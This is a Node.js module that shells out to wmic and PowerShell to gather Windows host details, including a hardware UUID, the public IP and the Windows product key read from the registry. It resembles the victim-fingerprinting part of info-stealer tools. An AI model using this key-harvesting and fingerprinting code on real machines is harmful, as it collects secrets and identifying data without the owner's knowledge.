const util = require("util");
const child_process = require("child_process")
const exec = util.promisify(child_process.exec);

async function getDisk() {
    try {
        let s = (await getCommand("wmic logicaldisk get size")).split(" ").filter(item => item.trim() !== "" && item.trim().toLowerCase() !== "size");
        return s.length > 0 ? Math.floor(parseInt(s[0]) / (1024 * 1024 * 1024)).toString() : "1000";
    } catch (e) {
        console.error(e);
        return "1000";
    }
}

async function getTotalMemory() {
    try {
        let t = await getCommand("wmic computersystem get totalphysicalmemory | more +1");
        return parseInt(Math.floor(parseInt(t) / (1024 * 1024 * 1024)));
    } catch (e) {
        console.error(e);
        return "4";
    }
}

async function getCleanUUID() {
    try {
        let u = await getCommand("wmic csproduct get uuid"),
            m = u.match(/UUID\s+([A-Fa-f0-9-]+)/);
        return m ? m[1] : "Not found";
    } catch (e) {
        console.error(e);
        return "Not found";
    }
}

async function getCommand(c) {
    try {
        let { stdout } = await exec(c);
        return stdout.trim();
    } catch (e) {
        console.error(e);
        return "";
    }
}

async function getCpuCount() {
    try {
        let s = await getCommand("echo %NUMBER_OF_PROCESSORS%"),
            c = parseInt(s);
        return isNaN(c) ? "4" : c.toString();
    } catch (e) {
        console.error(e);
        return "4";
    }
}

async function getInfo() {
    try {
        const [ 
            DISK, 
            RAM, 
            UID, 
            CPU_COUNT, 
            IP, 
            OS, 
            CPU, 
            GPU, 
            WINDOWS_KEY, 
            WINDOWS_VERSION
        ] = await Promise.all([
            getDisk(),
            getTotalMemory(),
            getCleanUUID(),
            getCpuCount(),
            getCommand("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress"),
            getCommand("wmic OS get caption, osarchitecture | more +1"),
            getCommand("wmic cpu get name | more +1"),
            getCommand("wmic PATH Win32_VideoController get name | more +1"),
            getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"),
            getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
        ]);
        return { 
            DISK, 
            RAM, UID, 
            CPU_COUNT, 
            IP, 
            OS, 
            CPU, 
            GPU, 
            WINDOWS_KEY, 
            WINDOWS_VERSION 
        }
    } catch (e) {
        console.error(e);
        return {
            DISK: "Not found",
            RAM: "Not found",
            UID: "Not found",
            CPU_COUNT: "Not found",
            IP: "Not found",
            OS: "Not found",
            CPU: "Not found",
            GPU: "Not found",
            WINDOWS_KEY: "Not found",
            WINDOWS_VERSION: "Not found",
        };
    }
}

module.exports = {
    getInfo,
};
